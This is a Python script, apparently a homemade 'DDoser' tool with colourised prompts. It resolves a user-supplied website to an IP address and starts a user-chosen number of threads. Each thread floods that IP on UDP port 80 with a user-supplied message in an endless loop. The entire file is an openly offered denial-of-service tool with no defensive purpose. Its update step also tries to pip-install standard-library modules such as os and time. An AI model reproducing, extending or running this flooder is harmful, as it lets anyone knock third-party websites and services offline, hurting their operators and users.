import time
import socket
import sys
import _thread
import os

class color:
    red = '\033[91m'
    sabz = '\033[92m'
    sefid = '\033[0m'
    narenji = '\033[93m'
    abi_kamrang = '\033[94m'
    
update = input(color.red+'       Update DDoser    n/y  ?   ')


if update == ('y'):
    print(color.sabz+'      ok')
    time.sleep(2)
    print(color.sabz+'      loading')
    print(color.sabz+'      loading.')
    time.sleep(1)
    print(color.sabz+'      loading..')
    time.sleep(2)
    print(color.sabz+'      loading...')
    os.system('clear')
    os.system('pip install os')
    os.system('pip install requests')
    os.system('pip install time')
    os.system('pip install sys')
    os.system('pip install socket')
    os.system('pip install colorama')
    os.system('python -m pip install pip')
    os.system('pip install pip')
    print(color.sabz+'.')
    os.system('pip')
    os.system('cls')
    os.system('clear')

if update == ('n'):
    print(color.sabz+'      ok')
    time.sleep(2)
    print(color.sabz+'      loading')
    print(color.sabz+'      loading.')
    print(color.sabz+'      loading..')
    time.sleep(1)
    print(color.sabz+'      loading...')
    time.sleep(1)
    print(color.sabz+'      starting...')
    os.system('clear')
    print('')
    print('')
    print('')



print('')
print(color.sabz+'''       \tW E L C O M   T O   D D O S E R    OS™ ''')
print('')
print(color.sefid+'------------------------------------------------------------')
print('')
print(color.narenji+'    Step 1.  Enter url')
print(color.narenji+'    Step 2.  Enter power attack')
print(color.narenji+'    Step 3.  Enter message attack ')
print(color.narenji+'    Step 3.  Start DDoser !!!')
print('')
print(color.sefid+'------------------------------------------------------------')
print('')
print('')
site = input(color.sabz+"      Enter your site url => ")
ip = socket.gethostbyname(site)
print('')
print("     your target IP:  ", ip)
print('')
thread_count = input(color.red+"      Enter your thread => ")
print('')
UDP_PORT = 80
MESSAGE = input(color.abi_kamrang+'      Enter message =>  ')
print(color.sefid+'------------------------------------------------------------')
time.sleep(2)
os.system('clear')
print(color.sabz+'''         \tS T A R T I N G    D D O S E R ''')
print('')
print(color.sefid+'------------------------------------------------------------')
print(color.sabz+"UDP target IP:", ip)
print(color.sabz+"UDP target port:", UDP_PORT)
time.sleep(5)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(color.sabz+"       DDos ataack !!! ")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass